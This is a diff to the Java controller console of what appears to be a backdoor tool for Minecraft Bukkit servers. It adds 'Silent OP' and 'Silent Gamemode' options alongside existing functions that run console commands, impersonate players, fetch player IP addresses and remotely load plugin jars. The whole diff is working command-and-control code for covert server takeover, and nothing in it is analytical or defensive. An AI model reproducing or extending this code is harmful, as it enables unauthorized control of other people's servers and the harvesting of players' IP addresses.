@@ -427,11 +427,13 @@ public class KutuzovServer {
         pnl("  1) Send console command");
         pnl("  2) Send command as player");
         pnl("  3) Send message as player");
-        pnl("  4) Get player ip");
-        pnl("  5) Show plugin list");
-        pnl("  6) Load plugin jar");
-        pnl("  7) Enable plugin");
-        pnl("  8) Disable plugin");
+        pnl("  4) Silent OP");
+        pnl("  5) Silent Gamemode");
+        pnl("  6) Get player ip");
+        pnl("  7) Show plugin list");
+        pnl("  8) Load plugin jar");
+        pnl("  9) Enable plugin");
+        pnl("  10) Disable plugin");
         pwl("Option: ");
         String input = readLine();
         int option = input.contentEquals("")?-1:Integer.parseInt(input);
@@ -502,6 +504,35 @@ public class KutuzovServer {
                 String player = readLine();
 
                 try {
+                    client.getOutput().writeObject(new SCBukkitOperator(player));
+                } catch (IOException exception) { exception.printStackTrace(); }
+            } break;
+
+            case 5: {
+                clearConsole();
+                pnl("Please input the desired player: ");
+                pwl("Player: ");
+
+                String player = readLine();
+
+                pnl("Please input the new gamemode(0-3): ");
+                pwl("Gamemode: ");
+
+                int gamemode = Integer.parseInt(readLine());
+
+                try {
+                    client.getOutput().writeObject(new SCBukkitGamemode(player, gamemode));
+                } catch (IOException exception) { exception.printStackTrace(); }
+            } break;
+
+            case 6: {
+                clearConsole();
+                pnl("Please input the desired player: ");
+                pwl("Player: ");
+
+                String player = readLine();
+
+                try {
                     client.getOutput().writeObject(new SCBukkitPlayerAddress(player));
 
                     Packet packet = null;
@@ -524,7 +555,7 @@ public class KutuzovServer {
                 }
             } break;
 
-            case 5: {
+            case 7: {
                 clearConsole();
                 pnl("Obtaining plugin list...");
 
@@ -551,7 +582,7 @@ public class KutuzovServer {
                 }
             } break;
 
-            case 6: {
+            case 8: {
                 clearConsole();
 
                 pnl("Please input the desired plugin file:");
@@ -565,7 +596,7 @@ public class KutuzovServer {
                 }
             } break;
 
-            case 7: {
+            case 9: {
                 clearConsole();
 
                 pnl("Please input the desired plugin name:");
@@ -579,7 +610,7 @@ public class KutuzovServer {
                 }
             } break;
 
-            case 8: {
+            case 10: {
                 clearConsole();
 
                 pnl("Please input the desired plugin name:");
